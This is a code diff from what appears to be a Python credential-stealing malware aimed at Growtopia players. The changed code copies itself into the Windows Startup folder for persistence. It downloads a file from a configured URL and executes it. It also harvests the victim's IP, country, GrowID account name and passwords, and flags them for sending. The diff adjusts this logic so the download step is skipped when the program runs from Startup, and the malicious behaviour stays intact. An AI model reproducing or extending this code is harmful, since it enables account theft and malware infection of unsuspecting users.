@@ -204,16 +204,17 @@ if __name__ == "__main__":
         wait_internet_connection()
         print("Internet connection established.")
 
+    startup_folder_path = os.path.join(
+        os.getenv("APPDATA"),
+        "Microsoft",
+        "Windows",
+        "Start Menu",
+        "Programs",
+        "Startup",
+    )
+
     if copy_executable_to_startup:
         try:
-            startup_folder_path = os.path.join(
-                os.getenv("APPDATA"),
-                "Microsoft",
-                "Windows",
-                "Start Menu",
-                "Programs",
-                "Startup",
-            )
             shutil.copy(sys.executable, startup_folder_path)
             print("Copied to startup successful")
         except Exception as e:
@@ -226,22 +227,25 @@ if __name__ == "__main__":
         except Exception as e:
             print(f"Command error: {e}")
 
-    if file_url:
-        file_name = os.path.basename(f"{file_url}")
-        temp_directory = tempfile.gettempdir()
-        file_path = os.path.join(temp_directory, file_name)
+    current_directory = os.getcwd()
+    
+    if current_directory != startup_folder_path:
+        if file_url:
+            file_name = os.path.basename(f"{file_url}")
+            temp_directory = tempfile.gettempdir()
+            file_path = os.path.join(temp_directory, file_name)
 
-        try:
-            response = requests.get(file_url)
-            with open(file_path, "wb") as file:
-                file.write(response.content)
-            os.popen(f"start {file_path}")
-            print(f"Download successful, file started")
-        except Exception as e:
-            print(f"Download error: {e}")
-            if os.path.exists(file_path):
+            try:
+                response = requests.get(file_url)
+                with open(file_path, "wb") as file:
+                    file.write(response.content)
                 os.popen(f"start {file_path}")
-                print("File started")
+                print(f"Download successful, file started")
+            except Exception as e:
+                print(f"Download error: {e}")
+                if os.path.exists(file_path):
+                    os.popen(f"start {file_path}")
+                    print("File started")
 
     ip_address = get_ip()
     country_code = get_country_code(ip_address)
@@ -264,7 +268,6 @@ if __name__ == "__main__":
                         if value != grow_id:
                             grow_id = value
                             print(f"GrowID: {grow_id}")
-
                             send = True
 
                 for key, value in result.items():
@@ -273,7 +276,6 @@ if __name__ == "__main__":
                             passwords = value.split("<BR>")
                             password_str = ", ".join(passwords)
                             print(f"Passwords: {password_str}")
-
                             send = True
 
                 for key, value in result.items():
